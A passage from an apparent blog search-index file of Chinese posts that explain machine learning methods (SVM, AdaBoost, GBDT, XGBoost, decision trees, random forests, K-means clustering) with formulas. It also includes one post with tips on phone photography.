L(W,b,\alpha)$：$$\hat{\alpha}=arg\max_\alpha(-\frac{1}{2}\sum_{i=1}^{n}\sum_{j=1}^{n}\alpha_i\alpha_jy_iy_jx_ix_j+\sum_{i=1}^{n}\alpha_i)$$算出$\hat{\alpha}$后将其带入到公式(3)、(4)中得到所求分离超平面的参数$\hat{W}$和$\hat{b}$，则分离超平面为：$$\hat{W}X+\hat{b}=0$$线性可分SVM的决策函数为：$$f(X)=sign(\hat{W}X+\hat{b})$$ 未完待续……]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（5）：提升算法（boosting algorithm）]]></title>
    <url>%2F2019%2F08%2F21%2Fboosting%2F</url>
    <content type="text"><![CDATA[本文将讲解有关提升算法的知识，主要包括提升算法的基本思想，以及几个具体的提升算法——AdaBoost算法、梯度提升决策树。以及梯度提升、加法模型和前向分步算法等内容。在本文中会先给出每个算法的思想和算法流程，最后再对其中用到的某些定义做总结。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法可以参考本人博客中该系列之前的文章，或者直接上网搜索相关的内容。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ 一、提升算法的基本思想先来了解几个概念。对于一个概念（一个类），如果存在一个多项式的学习算能够学习它，并且正确率很高，那么就称这个概念为强可学习的；反之，如果正确率仅仅比随机猜测的略好，则称这个概念是弱可学习的。有趣的是，后来有人证明强可学习和弱可学习两者是等价的。 提升（boosting）算法就是从弱可学习算法出发， 通过改变训练集中每个训练样本的权重，从而学习到多个弱分类器（又称基本分类器），并将这些弱分类器进行线性组合，从而得到一个强分类器。可以这样理解，强分类器的分类效果要比弱分类器好。又因为寻找一系列弱分类器比寻找一个强分类器简单，所以这种方式总是行之有效的。 二、AdaBoost算法从上述提升算法的基本思想中可知，在该算法中有两个问题需要解决，一是如何改变训练集中每个样本的权重？二是如何将若干弱分类器线性组合成一个强分类器？在AdaBoost算法中，解决第一个问题的方法是：提高那些被前一轮弱分类器错误分类的样本的权值，而降低那些被正确分类的样本的权值；而解决第二个问题的方法是：采用加权多数表决的方式。 AdaBoost算法的思想有点类似于随机森林，不同的是随机森林是采用多数表决的方式，并且生成每一个弱分类器（决策树）的方式也和AdaBoost不同。可以简单的总结为AdaBoost既对样本数据进行加权，又对分类器进行加权。需要说明的是，AdaBoost算法常用于二分类问题。 算法流程如下： (1) 初始化训练数据的权值分布$$W_1=(w_{11},w_{12},…,w_{1N}),\quad w_{1i}=\frac{1}{N}\quad i=1,2,…,N$$​ 初始化时，默认每个训练样本的权重都是相同的，它们的权重之和为1。 (2) 对于第m轮训练，m=1,2,…,M ​ （a）使用具有权值$W_m$的训练集数据学习，得到一个弱分类器$$G_m(x):\chi \rightarrow{-1,+1}$$​ 上式含义是该分类器的取值只有-1和+1两种情况。 （b）计算$G_m(x)$在训练集上的分类误差率$$e_m=\sum_{i=1}^N{P(G_m(x_i\neq y_i))}=\sum_{i=1}^N{w_{mi}I(G_m(x_i)\neq y_i)}$$​ $P(G_m(x_i\neq y_i))$表示预测值和实际值不相等的概率，$I()$是指示函数，当其条件满足时值为1，反之为0。 ​ 值得注意的是，在二分类问题中，一个分类器的效果往往要优于随机分类的效果，所以以上分类误差率的取值范围应该为 [0, 0.5] ​ （c）计算$G_m(x)$的系数$$\alpha_m=\frac{1}{2}\log\frac{1-e_m}{e_m}$$​ 该系数在由弱分类器线性组合为强分类器时起作用，它表示分类器$G_m(x)$在最终分类器中的重要程度。$\log\frac{1-x}{x}$的函数图像如下所示，当自变量（分类误差率）的取值范围为 [0, 0.5] 时，$\alpha_m$是恒大于0的。 ​ （d）更新训练数据集的权值分布$$W_{m+1}=(w_{m+1,1},w_{m+1,2},…,w_{m+1,N})$$ $$w_{m+1,i}=\frac{w_{mi}}{Z_m}exp(-\alpha_m y_i G_m(x_i))$$ ​ 上式中$Z_m$是规范化因子，它可以使更新后的权重成为一个概率分布。$$Z_m=\sum_{i=1}^N{w_{mi}exp(-\alpha_m y_iG_m(x_i))}$$​ 当某样本分类正确时，$y_iG_m(x_i)$大于0，又$\alpha_m$是非负数，所以更新后该样本的权重是小于1的；反之，更新后样本的权重是大于1的。这也就满足了误分类样本的权值得以扩大，而正确分类的样本的权值得以缩小（更重视分类错误的样本）。 *(3) * 得到M个弱分类器及其系数$\alpha_m$后，则可以得到它们的线性组合$$f(x)=\sum_{m=1}^M{\alpha_mG_m(x)}$$​ 值得注意的是，$\alpha_m$之和并不为1。 ​ 于是最终的强分类器是：$$G(x)=sign(f(x))=sign(\sum_{m=1}^M{\alpha_mG_m(x)})$$ 三、加法模型和前向分步算法加法模型：$$f(x)=\sum_{m=1}^M{\beta_mb(x;\gamma_m)}$$其中，$b(x;\gamma_m)$是一个基函数，$\gamma_m$是该基函数的参数，$\beta_m$是该基函数的系数。 前向分步算法： 对于以上加法模型，在给定损失函数 L(y, f(x)) 的前提下，要学习使得模型最优的$\beta_m$和$\gamma_m$就是求解以下损失函数最小化问题：$$min_{\beta_m,\gamma_m}\sum_{i=1}^N{L(y_i,\sum_{m=1}^M{\beta_mb(x;\gamma_m))}}$$而要同时求出从m=1到M的所有参数是比较困难的，所以人们提出了前向分步算法（foward stagewise algorithm），它的思想是：因为学习的是加法模型，如果能够从前向后，每一步只学习一个基函数及其参数，并逐步逼近优化目标函数式（以上损失函数最小化公式），那么就可以简化优化的复杂度。 算法流程如下： (1) 初始化加法模型：$$f_0(x)=0$$(2) 对m=1,2,….,M ​ (a) 极小化损失函数$$(\beta_m,\gamma_m)=arg\min_{\beta,\gamma}\sum_{i=1}^N{L(y_i,\sum_{m=1}^M{\beta_mb(x;\gamma_m))}}$$​ 得到参数$\beta_m,\gamma_m$，从而也就确定了第m个基函数 ​ (b) 更新第m个加法模型$$f_m(x)=f_{m-1}(x)+\beta_mb(x;\gamma_m)$$​ 即第m个加法模型为当前（第m-1个）加法模型和第m个基函数的加权和。 (3) 得到最终的加法模型：$$f(x)=f_M(x)=\sum_{m=1}^M{\beta_mb(x;\gamma_m)}$$ 前向分步算法将同时求出从m=1到M的所有参数$\beta_m,\gamma_m$的优化问题简化为了逐步求解各个$\beta_m,\gamma_m$的优化问题。 四、梯度提升决策树梯度提升决策树（GBDT）是提升决策树和梯度提升算法相结合的产物，下面先来讲解提升（决策）树，这是一种采用加法模型和前向分步算法的决策树，其模型为：$$f_M(x)=\sum_{m=1}^M{T(x;\theta_m)}$$其中$T(x;\theta_m)$是决策树，$\theta_m$是该决策树的参数，M是决策树的个数。本模型是《统计学习方法》中给出的，我有点好奇为什么每个决策树之前没有系数，有知道的朋友还请告知~ 提升树算法流程如下： (1) 初始的加法模型为：$$f_0(x)=0$$(2) 在生成第m个加法模型时 ​ (a) 根据当前模型$f_{m-1}(x)$，找到一个可以使得第m个加法模型最优的决策树$T(x;\theta_m)$$$\hat{\theta_m}=arg\min_{\theta_m}\sum_{i=1}^N{L(y_i,f_{m-1}(x_i)+T(x;\theta_m))}$$​ 也就是找到该决策树的参数$\hat{\theta_m}$ ​ (b) 生成第m个加法模型：$$f_m(x)=f_{m-1}(x)+T(x;\theta_m)$$(3) 最终的加法模型为：$$f_M(x)=\sum_{m=1}^M{T(x;\theta_m)}$$ 在以上第(2)步，(a)步骤时，如果损失函数是平方误差损失，则$$L(y_i,f_{m-1}(x_i)+T(x;\theta_m))=[y-f_{m-1}(x)-T(x;\theta_m)]^2$$其中$y-f_{m-1}(x)$是数据的残差，即观测值与估计值之差。 对于一般的损失函数来说，求解最优的$\hat{\theta_m}$是不容易的，所以有人提出了用梯度提升（gradient boosting）算法，用损失函数的负梯度在当前模型的值来作为上式中残差值的近似，从而简化求解$\hat{\theta_m}$的过程。 加入了梯度提升算法的提升决策树就被称为梯度提升决策树。 五、XGBoostXGBoost是一种二分类器，它的基本思想和GBDT类似，学习该方法应该提前掌握加法模型、前向分步算法和决策树的相关内容。 先来回顾一下，决策树的基本思想是：从根节点开始，每次选择一个最优特征对当前样本进行划分，并生成相应的子节点，递归的进行这一过程，直到叶节点中包含的样本都是同一类别或没有合适的特征为止。对于决策树中的叶子节点来说，它表示其内的样本属于该类别的概率值。通常来说只用一棵决策树进行分类的效果是不怎么好的，所以有人就考虑——如果使用多棵决策树进行分类呢？如果在决策树$T_1$中样本$S$所属的叶节点权重为1.3，而在决策树$T_2$中样本$S$所属的叶节点权重为0.8，则该样本最终的权重是2.1（可以理解为得分，得分越高，属于该类别的概率越大）。 XGBoost的算法流程： (1) 初始的预测模型（加法模型）为：$$\hat{y}_i^{(0)}=0$$(2) 在生成第t个预测模型时 ​ (a) 根据一定的规则生成一棵当前最优的决策树$f_{t-1}(x_i)$，具体生成方面后面会说明； ​ (b) 生成第t个预测模型：$$\hat{y}i^{(t)}=\hat{y}_i^{(t-1)}+f{t-1}(x_i)$$(3) 最终的预测模型为：$$\hat{y}i^{(T)}=\sum{t=1}^M{f_{t}(x_i)}$$ 在上述第(2)步，(a)步骤的时候，设生成决策树的目标函数为：$$J(f_t)=\sum_{i=1}^nL(y_i,\hat{y}t^{(t-1)}+f_t(x_i))+\Omega(f_t)$$在某些书籍中以上目标函数还会有个常数项$c$，上式中n是样本个数，$L()$是损失函数，$\Omega(f_t)$是关于决策树的正则项，其定义如下：$$\Omega(f_t)=\gamma\cdot T_t+\lambda\cdot\frac{1}{2}\sum{i=1}^T{w_j^2}$$上式中，$T_t$是当前决策树的叶节点个数，$w_j$是叶节点的权重，$\gamma$和$\lambda$是系数。即正则项为节点总数和叶节点权值平方和的加权和。 要想求一棵当前最优的决策树，则就要求一棵决策树从而使得其目标函数最小。为了方便处理，我们需要对决策树的目标函数做一系列变换。我们知道泰勒展开的二阶形式如下：$$f(x+\Delta x)=f(x)+f^`(x)\Delta x+\frac{1}{2}f^{``}(x)\Delta x^2$$对于损失函数$L()$，将其看作函数$f()$，将其中的$\hat{y}_i^{(t-1)}$看作$x$，将$f_t(x_i)$看作$\Delta x$，另：$$g_i=\frac{\partial L(y_i,\hat{y}_i^{(t-1)})}{\partial \hat{y}_i^{(t-1)}}$$ $$h_i=\frac{\partial^2 L(y_i,\hat{y}_i^{(t-1)})}{\partial^2 \hat{y}_i^{(t-1)}}$$ 然后将损失函数在$x=0$处进行二阶泰勒展开，并带入到目标函数中得：$$J(f_t)=\sum_{i=1}^n{[L(y_i,\hat{y}_i^{(t-1)})+g_if_t(x_i)+\frac{1}{2}h_if_t^2(x_i)]}+\Omega(f_t)$$然后对上式进行整理： 上图中第一行到第二行之间，因为$L(y_i,\hat{y}i^{(t-1)})$是一个常数，在求解最优决策树时不会产生影响，所以就给去除了。第三行中$q(x_i)$表示样本$x_i$所在叶节点编号，$w{q(x_i)}$表示该叶节点的权重。此外，第三行中的$\sum$是遍历的样本，第四行中的$\sum$是遍历的叶节点，这个点需要注意。 为了方便表示，我们定义：$$G_j=\sum_{i\in I_j}{g_i}$$ $$H_j=\sum_{i\in I_j}{h_i}$$ 经过以上的化简和整理，得到目标函数：$$J(f_t)=\sum_{j=1}^T{[G_jw_j+\frac{1}{2}(H_j+\lambda)w_j^2]}+\gamma\cdot T$$到目前为止，我们做的只是对目标函数的化简，下一步就要根据目标函数构造出一棵使得目标函数值最小的决策树，也就是求决策树最优的叶节点的权值。让目标函数对叶节点权值$w_j$求偏导，并令其为0得：$$\frac{\partial J(t_t)}{\partial w_j}=G_j+(H_j+\lambda)w_j=0$$ $$\Rightarrow\quad w_j=-\frac{G_j}{H_j+\lambda}$$ 再将最优的权值带入到目标函数，可得：$$J(f_t)=-\frac{1}{2}\sum_{j=1}^T{\frac{G_j^2}{H_j+\lambda}}+\gamma\cdot T$$需要说明的是，在XGBoost算法中，所构建的决策树是二叉树。已经知道了叶节点权值最优时目标函数的表达式，那么如何构建决策树呢？这里采用的是贪心的策略，如果根据某个特征对决策树进行划分，则划分后比划分前目标函数值降低的量越大，说明该划分越优。所以可以遍历所有可能的划分，取目标函数值降低最大的特征进行划分。 设划分后形成的左子树为L，右子树为R，则划分后目标函数值降低的量为：$$Gain=\frac{1}{2}[\frac{G_L^2}{H_L+\lambda}+\frac{G_R^2}{H_R+\lambda}-\frac{(G_L+G_R)^2}{H_L+H_R+\lambda}]-\gamma$$ 以上Gain就相当于普通决策树中的信息增益/信息增益率/Gini系数了。 XGBoost与BGDT的主要区别： (1) XGBoost的损失函数增加了正则项，而GBDT没有。 (2) XGBoost损失函数是误差部分是二阶泰勒展开，GBDT 是一阶泰勒展开。因此损失函数近似的更精准。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（4）：决策树和随机森林]]></title>
    <url>%2F2019%2F08%2F19%2FDT%26RF%2F</url>
    <content type="text"><![CDATA[本文将讲解决策树和随机森林的基本思想，以及信息增益、信息增益率（比）、Gini系数等理论部分的内容，此外还有决策树的剪枝等内容。该部分内容主要是定义比较多，算法思想并不是很难。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法可以参考本人博客中该系列之前的文章，或者直接上网搜索相关的内容。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ 一、决策树的基本思想决策树（decision tree）是一种树形的分类回归方法，本文中只讨论用于分类的决策树。在决策树中的每个内部节点表示在一个特征上的测试，每个分支代表一个测试输出，每个叶节点表示一种类别。决策树采用自顶向下的递归方法，其基本思想是：从根节点开始，每次选择一个最优特征对当前样本进行划分，并生成相应的子节点，递归的进行这一过程，直到叶节点中包含的样本都是同一类别或没有合适的特征为止。所谓的最优特征就是按该特征将样本进行划分后得到的分类与其真实分类最接近的特征。下图可以看作是一个女生选择是否要与相亲对象见面的决策树模型： 决策树算法流程： (1) 首先构建包含所有训练数据的根节点，并根据信息增益/信息增益率/Gini系数选择当前训练集的最优特征，据此对训练集进行划分，并生成相应的子节点； (2) 当子节点中的样本均属于同一分类时，则该节点为叶节点，不再对其进行划分； (3) 反之选择新的最优特征对当前样本进行划分，构建新的子节点； (4) 递归的进行(2)、(3)两步，直到所有样本均分类正确或没有合适特征为止； (5) 得到一棵决策树。 二、主要标记和基本概念以下所谈到的主要标记和基本概念当前只需粗略的读一遍，有个印象即可，等后面用到的时候再回来查也不迟。其中有很多知识后面用不到，但是可以帮助我们理解，所以也就一并列在下面了。 1.主要标记设训练数据集为D，|D|表示训练集样本个数。 设有K个类别，分别为：$C_k, k=1,2,…,K$，|$C_k$|为该类别下的样本个数。 设特征A有n个不同的取值，分别为：${a_1,a_2,…,a_n}$，根据特征A的取值将D划分为n个子集$D_1,D_2,…,D_n$，$|D_i|$为该子集的样本个数。 记子集$D_i$中属于类别$C_k$的样本集合为$D_{ik}$，$|D_{ik}|$为$D_{ik}$的样本个数。 2.基本概念(1) 信息量信息量就是一个事件包含的信息的数量，若设随机变量X的概率分布为 p(X)，则其信息量为：$$h(X)=-\ln p(X)$$事件发生的概率越小，其信息量越大。比如太阳从西边升起是小概率事件，其信息量非常大。由定义可知信息量还满足两个事件同时发生的信息量为两者信息量之和，即：$$h(XY)=h(X)+h(Y)$$ (2) 熵中学学过，熵（entropy）表示系统的混乱程度。在这里熵的含义类似，表示随机变量的不确定性程度。我们定义信息量的期望为熵：$$H(X)=-\sum_{x\in X}{p(x)\ln p(x)}$$当熵和条件熵中的概率由数据估计（比如极大似然估计）得到时，所对应的熵和条件熵分别被成为经验熵和经验条件熵。 训练集D的经验熵为：$$H(D)=-\sum_{k=1}^{K}{\frac{|C_k|}{|D|}\ln{\frac{|C_k|}{|D|}}}$$ (3) 联合熵事件X、Y的联合熵就是两者同时发生时的熵，即：$$H(X,Y)=-\sum_{x,y}{p(x,y)\ln p(x,y)}$$ (4) 条件熵条件熵定义为X给定条件下Y的条件概率分布的熵对X的数学期望：$$H(Y|X)=-\sum_{x,y}{p(x,y)\ln p{(y|x)}}=H(X,Y)-H(X)$$条件熵H(Y|X)表示在已知X的条件下，随机变量Y的不确定性。 训练集D的条件经验熵为：$$H(D|A)=-\sum_{i=1}^{n}{\frac{|D_i|}{|D|}}\sum_{k=1}^{K}{\frac{|D_{ik}|}{|D_i|}}\ln{\frac{|D_{ik}|}{D_i}}$$ (5) 互信息随机变量的X、Y的互信息定义为：$$I(X,Y)=H(X)+H(Y)-H(X,Y)$$下图是熵、联合熵、条件熵和互信息四者的关系图。 从图中还可以得出以下等式：$$I(X,Y)=H(X)-H(X|Y)=H(Y)-H(Y|X)$$ (6) 信息增益特征A对训练数据集D的信息增益g(D,A)定义为集合D的经验熵H(D)与特征A给定条件下D的经验条件熵H(D|A)之差，即：$$g(D,A)=H(D)-H(D|A)$$仔细观察可以发现，以上D和A的信息增益就是两者的互信息。上式中H(D)表示对数据集D进行分类的不确定姓。H(D|A)表示在特征A给定的条件下对数据集D进行分类的不确定性。信息增益表示得知特征A而使得对数据集D的分类的不确定性减少的程度。 (7) 信息增益率（比）特征A对训练数据集D的信息增益率$g_R(D,A)$定义为信息增益g(D,A)与训练数据集D关于数据A的值的熵$H_A(D)$之比，即：$$g_R(D,A)=\frac{g(D,A)}{H_A(D)}$$信息增益率的提出是为了解决在以信息增益作为划分训练数据集的特征时，存在偏向于选择取值较多的特征作为最优特征的问题。 (8) Gini（基尼）系（指）数假设有K个类别，样本点属于第k类的概率为$p_k$，则概率分布的基尼系数为：$$Gini(p)=\sum_{k=1}^{K}{p_k(1-p_k)}=1-\sum_{k=1}^{K}{p_k^2}=1-\sum_{k=1}^{K}(\frac{|C_k|}{|D|})^2$$一个特征的信息增益/信息增益率/Gini系数越大，表明该特征对样本的熵的减少能力越强，换句话说，该特征使得数据由不确定性变为确定性的能力越强。 三、三种决策树算法当前比较流行的有三种决策树算法，分别是ID3、C4.5和CART算法，三种算法均采用在第一部分提到的“决策树算法流程”。其中ID3算法采用信息增益来进行特征选择；C4.5算法采用信息增益率来进行特征选择；CART算法是Classification and Regression Tree的缩写，也就是分类与回归树，它采用Gini系数来进行特征选择。此外，CART树一定是一棵二叉树，而其他两种也可以是多叉树。 四、剪枝算法生成的决策树往往会存在过拟合的问题，为了避免这一问题需要对其进行剪枝操作。对决策树进行简化的过程被称为剪枝（pruning），它又可以分为预剪枝和后剪枝两种。预剪枝就是在决策树生成的过程中根据某些条件（如节点所含的样本数）判断是否继续划分当前节点。而后剪枝是指在决策树生成后，由完全树$T_0$开始，剪枝部分节点得到$T_1$，再次剪枝部分节点得到$T_2$，直到仅剩下树根的树$T_K$，并在验证集数据上对这K个决策树进行评价，选择损失函数最小的数$T_\alpha$作为最终的决策树。 剪枝时所用的损失函数为：$$C_\alpha(T)=C(T)+\alpha |T_{leaf}|$$其中$\alpha$被称为剪枝系数，满足$\alpha \geq 0$，$|T_{leaf}|$是叶节点的个数，C(T)是所有叶节点的熵的加权和，其表达式如下所示。之所以加权是因为每个叶节点包含的样本个数不同。当$\alpha$小时，最优子树偏大（节点多）；当$\alpha$大时，最优子树偏小。$$C(T)=\sum_{t\in{leaf}}{N_tH(t)}$$上式中$N_t$是叶节点的样本个数。 对一个内部节点进行剪枝，剪枝完毕后其子节点全部被去除，而生成一个新的节点来代替原节点。故对内部节点t剪枝前的损失函数为以节点t为根的子树$T_i$的损失函数$C_\alpha(T_t)$：$$C_\alpha(T_t)=C(T_t)+\alpha|T_t|$$而对内部节点t剪枝后的损失函数为以节点t为单节点树的损失函数$C_\alpha (t)$：$$C_\alpha(t)=C(t)+\alpha$$如果在对节点t进行剪枝后，损失函数相同，但是决策树模型变简单了，则说明该剪枝是可行的。故可以让$C_\alpha(t)=C_\alpha(T_t)$，联立以上两个方程式，求解$\alpha$的值：$$\alpha=\frac{C(t)-C(T_t)}{|T_t|-1}$$ 上式表示剪枝后整体损失函数减少的程度。所以在剪枝时，需要计算每一个内部节点t 的剪枝系数$\alpha_t$的值，并对$\alpha_t$最小的节点进行剪枝，不断剪枝下去，直到只剩下根节点。 五、随机森林一棵树是树，多棵树就是森林了。随机森林（random forest）的基本思想是建立多棵决策树，让所有的决策树投票表决待分类样本所属的分类，票数最多的类别就是最终的预测结果。 1.Bootstrap采样bootstrap采样就是从样本集（样本数为N）中随机的重采样出N个样本形成一个训练集。所谓重采样就是有放回的采样，这样可以使训练集中的某个样本出现多次。 2.Bagging（装袋）bagging的策略如下： (1) 从样本集（样本数为N）中使用bootstrap采样出N个样本形成一个训练集； (2) 对于该训练集来说，在所有属性上对其建立一个分类器； (3) 重复以上两步K次，形成K个分类器； (4) 根据K个分类器的投票结果，觉得样本属于那一类。 3.随机森林随机森林在bagging策略的基础上进行了修改，其算法流程如下： (1) 从样本集（样本数为N）中使用bootstrap采样出N个样本形成一个训练集； (2) 对于该训练集来说，先从所有（M个）属性上随机选择m个属性，并对这m个属性构建一棵决策树。其中m&lt;&lt;M，&lt;&lt;是远小于的意思； (3) 重复以上两步K次，形成K棵决策树； (4) 根据K棵决策树的投票结果，觉得样本属于那一类。 决策树中所谓的随机就是指随机抽取n个样本作为训练集，随机选择m个属性构建决策树。值得注意的是，在随机森林算法中生成决策树的过程中是不需要对其进行剪枝操作的。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[掌握这些技巧，手机也能拍出美美的照片~]]></title>
    <url>%2F2019%2F08%2F17%2Fphoto%2F</url>
    <content type="text"><![CDATA[从大学开始刻意训练拍照技术以来，曾经有那么几个瞬间突然感觉到自己掌握了拍照的窍门，自己也的确使用了一些大家都可以学到的方法，并且拍出过几张还比较不错的照片，所以今天就来科普一下如何用手机拍出美美的照片。希望大家能有所收获，如果不能，就当做是我个人的摄影展了。本文主要从构图、光线、对焦和曝光以及后期等方面来说明，不过需要说明的是这些方法大多适用于排风景照，至于人物照本人实在没有什么经验。以下用到的图片均为本人手机拍摄~ 一、构图网上关于拍照的构图方式有很多，下面主要讲解对称构图、中心构图、九宫格构图和对角线构图四种构图方法，其实这四种方法完全可以融合为一种构图方法——九宫格构图法。 1.中心构图中心构图是拍照时最简单的一种构图方式，顾名思义，也就是把被拍摄的物体放到画面的中心。对于大多数情况来说，这样拍最简单，也是最百搭的一种方式，但是拍出的照片往往不会太让人惊艳。 2.对称构图世界上很多东西都是具有对称性的，在拍摄一些例如建筑之类的物体时就可以采用对称构图，这种构图方式会使得建筑看起来比较宏伟、庄严肃穆，但是缺乏动感。 如果想让拍出来的建筑具有动感，那就应该从建筑物的侧面进行拍摄，如下图。 当你想拍摄的物品周围有一汪水的时候，还可以结合水中的倒影进行拍摄，往往会有很好的效果。 3.九宫格构图九宫格构图绝对是最重要的构图方式，其他的构图方式往往可以包含在九宫格构图法中。九宫格构图就是把一张图片的横纵方向都平均分为三等分，形成一个九宫格。目前绝大多数手机的相机都提供了该功能，大家可以在相机设置中打开“参考线”选项。下面看一张图片然后来对其进行分析。 如上图所示，绿线就是手机相机自带的九宫格线。在拍照时，我们应该把待拍摄的物体，或者是画面中最明亮的地方，或者多条延长线的交点，放到九宫格的四个交点的位置上，也就是图中红色圆圈的位置。至于图中的蓝色线，下面讲解对角线构图时会提到。 当所拍摄的画面既有天空，又有地面上的其他物体时，往往会让天空占据1/2或者1/3的空间， 其他比例往往都不如这两种看起来美观。根据九宫格我们能很容易的做到这一点。 并且一定要注意地平面（或者海平面）一定要保持水平！而穿过画面最中心物体的线要保持垂直！不然就会给人一种把照片拍歪了的感觉。根据九宫格我们也很容易让地平面保持水平。你会发现，下图中天空占的比例也差不多是1/2。 4.对角线构图之前图中的蓝线是由图片的四个角延伸到了九宫格线的某个交点（图中红色的圆圈）处所形成的，这样当人在观看图片时，会不自觉的从近到远的沿着对角线看过去，最后直线会汇合到一点，这样看起来会有一种纵深感。 其实一般来说，图中的四条蓝线只要凑够两条就足够让图片变得漂亮了，当然了，直线最终汇合的也可以是其他三个红色交点之一。如下图所示，也是使用了对角线构图法进行拍摄的。 5.其他构图还有很多文章中会提到螺旋线构图法，但是我觉得这种方法是事后诸葛亮，很难学习并用来实践。此外在构图的时候如果在前景中有树枝或门框等构成一个类似相框的结构，而背景是要拍摄的主体，也会起到不错的效果。例如下图中的门框是一个前景，而背景是要拍摄的主体，主体被门框“框”了起来。 再比如下图，前景中的树枝也起到了类似的作用，同时该图也可以看作是中心构图。 二、光线“上帝说：要有光！”。摄影本来就是光与影的艺术，当你看到你想拍摄的物体被光线照亮，而其他部分则比较暗时，不要犹豫，拍它！ 上面这张图也可以验证前面说的一点，建筑物的中心线要与地面保持垂直。 从摄影的角度来看，光分为很多种——顺光、逆光、侧光等。一般情况下都会使用顺光来进行拍摄，也就是保持拍摄的方向和光线打在物体上的方向一致。这样拍出来的图片比较明亮，逆光拍摄通常导致画面整体或局部偏暗，或者过曝。不过，逆光情况下也可以拍出很好的照片，比如下面的照片，由于物体遮挡了大部分的光线，所以照片没有偏暗或过曝，而是显得更有活力。 再看另一张，其实下面这张图的树干部分还是有点偏暗了。 三、对焦和曝光在拍摄照片时，对焦也比较重要，虽然手机相机都有自动对焦功能，但是自动对焦的效果的确堪忧。对焦的操作也很简单，对于大部分手机来说只需要在被拍摄物体上点一下即可。这样拍摄的焦点就转移到了待拍摄物体上，而其他物体或背景就会在一定程度上被虚化。除了对焦，还可以调整相机的曝光度，具体做法是在待拍摄物体上点一下，并上下拖动，就会出现一个滚动条。当要拍摄的物体比较暗时，就可以通过调整曝光度来提升整个画面的亮度，但是要注意如果太亮就会导致过曝了。 四、后期后期无疑也是非常重要的一环，至于那些瘦腿、瘦脸、祛痘、美白啊，我平常不用，也不会。我要说的主要是以下几点：当水平线拍歪了时，可以调整图片旋转的角度，将图片调正。当图片中出现杂物时，可以通过魔法消除或者对图片进行剪切等方法来去除杂物。此外还可以更换滤镜，调整亮度、饱和度、锐度等等。也就不再放图并一一展开说了，相信大家都比较熟悉。 五、其他在拍摄照片的时候我比较倾向于使用16:9的比例，无论是从美观程度来说也好，还是从后期图片剪切的角度来说也好，我觉得这个比例比4:3的要更好。此外，如果想拍出浓浓文艺范的图片，可以尝试一下拍黑白照片，或者添加适当的滤镜。此外，还应该多尝试新的角度，可以将相机放低，或者采用俯瞰等角度进行拍摄。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（3）：聚类算法之K均值算法、层次聚类和密度聚类]]></title>
    <url>%2F2019%2F08%2F17%2Fclustering%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关聚类的相关算法，包括K均值聚类、层次聚类以及密度聚类等，除此之外，还会讲解聚类算法中的一些基本概念，以及聚类算法效果评判的一个标准——轮廓系数。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法可以参考本人博客中该系列之前的文章，或者直接上网搜索相关的内容。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ 一、聚类定义聚类就是对大量未标注的数据，按照数据内在的相似性，将其划分为多个类别，从而使类别内的数据相似度较大，而类别之间的数据相似度较小。它与分类算法的不同之处简单来说就是，分类是有监督学习 ，而聚类是无监督学习。聚类算法的基本思想是：对于给定的类别数K，首先对样本随机给出K个初始划分，并通过不断的迭代来更新每个样本所属的类别，从而使得每一次迭代后的划分结果要比前一次好。当迭代次数达到某个阈值，或者类别中心的变化小于某个阈值时，算法停止。 二、相似度/距离聚类算法通常会根据两个样本点之间的相似性来进行分类，而描述两个样本点之间的相似程度的方式主要有以下几种： 1.样本间相似度(1)).欧氏距离两个点X和Y之间的欧氏距离可以由以下公式表示，其中$x_i$和$y_i$是两点在不同维度的坐标值，无疑两点之间的欧式距离越小，两点相似度越高。$$dist(X,Y)=(\sum_{i=1}^{n}{|x_i-y_i|^2})^{\frac{1}{2}}$$ (2).余弦相似度两个向量a、b之间的余弦相似度公式如下，其中$\theta$是两个向量之间的夹角（小于180°），余弦相似度的取值范围是[-1,1]，其值越趋近于1，则两个向量越相似。$$\cos(\theta)=\frac{\vec{a}\cdot\vec{b}}{|\vec{a}|\cdot|\vec{b}|}$$ (3).相关系数两个随机变量之间的相关系数公式如下，其中cov(X,Y)是两者的协方差，$\sigma_X$和$\sigma_Y$是两者的标准差。相关系数的绝对值越趋近于1两者越相似，越趋近于0越不相似。$$\rho_{XY}=\frac{cov(X,Y)}{\sigma_X\cdot\sigma_Y}$$ (4).杰卡德（Jaccard）系数两个集合之间的杰卡德系数公式如下，分子分母分别为两个集合的交集和并集。$$J(A,B)=\frac{|A\cap B|}{|A\cup B|}$$除了以上提到的之外，还有曼哈顿距离、相对熵和Hellinger距离等，就不在一一介绍了。 2.类别间距离类$C_p$和类$C_q$之间的距离D(p,q)，也称作连接，类与类之间的距离有以下几种： (1).最短距离（单连接）：定义两个类中样本的最短距离为类间距离。 (2).最长距离（完全连接）：定义两个类中样本的最长距离为类间距离。 (3).中心距离：定义两个类的类别中心之间的距离为类间距离。 (4).平均距离：定义两个类中所有样本之间的平均值为类间距离。 三、K均值算法K均值算法又称K-means算法，它的主要思想是事先选定k个类别中心，计算每个样本点距离类别中心的距离，并将其归类为距离最近的类别。然后重新计算类别中心（样本的均值），并重新对所有样本点进行分类，重复该过程直到样本中心的变化幅度小于某个阈值。值得注意的是，该算法中的K值是需要事先给定的。算法示意图如下： 算法流程如下： (1) 选择初试的K个类别中心 $\mu_1,\mu_2,…,\mu_K$。类别中心就是就是同一类别中所有样本的均值； (2) 对于每个样本$x_i$，标记其所属的类别为距离他最近的类别中心所代表的类别，即：$$label_i=arg 